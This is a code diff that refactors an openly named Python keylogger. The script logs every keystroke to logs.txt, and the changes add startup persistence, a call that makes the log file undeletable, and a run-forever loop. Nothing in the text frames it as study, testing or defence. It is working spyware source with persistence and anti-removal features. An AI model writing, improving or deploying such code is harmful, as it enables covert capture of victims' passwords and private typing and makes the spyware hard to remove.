@@ -5,17 +5,29 @@ from test import run_forever
 from test1 import make_file_undeletable
 import background_runner
 
+LOG_FILE = "logs.txt"
+
+
 def on_press(key):
-    with open("logs.txt", "a") as file:
-        file.write(f"{key}\n")
-with Listener(on_press=on_press) as listener:
-    listener.join()
+    """Log each keystroke to logs.txt."""
+    try:
+        with open(LOG_FILE, "a") as file:
+            file.write(f"{key}\n")
+    except Exception as e:
+        print(f"Error logging keystroke: {e}")
 
 
+def start_keylogger():
+    """Start the keylogger listener."""
+    try:
+        with Listener(on_press=on_press) as listener:
+            listener.join()
+    except Exception as e:
+        print(f"Keylogger failed to start: {e}")
+        raise
 
 
-background_runner.run_on_startup(on_press())
-# make_file_undeletable(on_press())
-run_forever(INPUT="keylogger")
-
-# for termination of the code we have to delete the terminal running the file
+if __name__ == "__main__":
+    background_runner.run_on_startup()
+    make_file_undeletable(LOG_FILE)
+    run_forever(INPUT="keylogger")
